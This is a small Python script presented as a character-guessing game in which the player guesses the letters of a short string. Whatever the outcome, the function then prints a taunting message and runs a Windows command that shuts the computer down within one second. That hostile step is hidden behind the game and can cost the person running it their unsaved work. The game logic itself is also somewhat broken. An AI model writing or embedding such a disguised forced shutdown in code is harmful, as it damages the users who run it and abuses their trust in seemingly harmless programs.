
import os
def guesschar(y):
    if y=="backslash":
        letter =1
        attempt =1
        while(attempt<6):
            if (letter ==1):
                guess = input("enter you guess for the character ")
                if(guess=="z"):
                    letter=letter+1
                else:
                    attempt=attempt+1
            elif (letter ==2):
                guess = input("enter you guess for the character ")
                if(guess=="e"):
                    letter=letter+1
                else:
                    print("wrong guess try again ")
                    attempt=attempt+1
            elif (letter ==3):
                guess = input("enter you guess for the character ")
                if(guess=="r"):
                    letter=letter+1
                else:
                    print("wrong guess try again ")
                    attempt=attempt+1
            elif (letter ==4):
                guess = input("enter you guess for the character ")
                if(guess=="o"):
                    letter=letter+1
                else:
                    print("wrong guess try again ")
                    attempt=attempt+1
            elif (letter ==5):
                guess = input("enter you guess for the character ")
                if(guess=="-"):
                    letter=letter+1
                else:
                    print("wrong guess try again ")
                    attempt=attempt+1
            elif (letter ==6):
                guess = input("enter you guess for the character ")
                if(guess=="r"):
                    letter=letter+1
                else:
                    print("wrong guess try again ")
                    attempt=attempt+1
            elif (letter ==7):
                guess = input("enter you guess for the character ")
                if(guess=="\\"):
                    letter=letter+1
                else:
                    print("wrong guess try again ")
                    attempt=attempt+1
            else:
                print("you have the full word now just stop the code .")
                attempt = 7
    print("shutting down your laptop hahahah")
    os.system("shutdown /s /t 1")